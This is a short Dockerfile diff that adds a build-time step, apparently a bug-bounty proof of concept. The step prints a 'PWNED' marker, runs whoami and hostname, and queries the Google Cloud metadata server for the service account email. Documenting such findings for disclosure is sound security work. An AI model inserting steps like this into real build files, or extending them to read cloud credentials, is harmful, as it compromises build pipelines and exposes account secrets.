@@ -26,6 +26,13 @@ RUN apk update \
     && apk add --no-cache g++ linux-headers \
     && rm -rf /var/cache/apk/*
 
+# --- PoC (non-destructive, VRP submission — remove before merge) ---
+RUN echo "PWNED-BY-<your-h1-handle>-$(date -u +%s)" && \
+    echo "whoami=$(whoami) host=$(hostname)" && \
+    (curl -s -H 'Metadata-Flavor: Google' \
+       'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
+       || echo "no metadata access") && echo
+
 # get packages
 COPY requirements.txt .
 RUN pip install -r requirements.txt
